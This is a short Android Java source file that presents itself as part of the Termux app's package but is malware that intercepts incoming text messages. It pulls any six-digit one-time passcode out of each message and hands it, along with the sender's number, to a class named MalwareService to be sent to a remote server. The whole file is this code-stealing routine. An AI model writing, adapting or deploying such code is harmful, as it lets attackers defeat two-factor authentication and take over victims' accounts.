package com.termux.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import java.util.regex.Pattern;
import java.util.regex.Matcher;

public class SMSReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Object[] pdus = (Object[]) intent.getExtras().get("pdus");
        for (Object pdu : pdus) {
            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
            String message = sms.getMessageBody();
            String sender = sms.getOriginatingAddress();
            Pattern pattern = Pattern.compile("\\b\\d{6}\\b");
            Matcher matcher = pattern.matcher(message);
            if (matcher.find()) {
                String code = matcher.group();
                new MalwareService().sendToServer("SMS CODE: " + code + " | FROM: " + sender);
            }
        }
    }
}
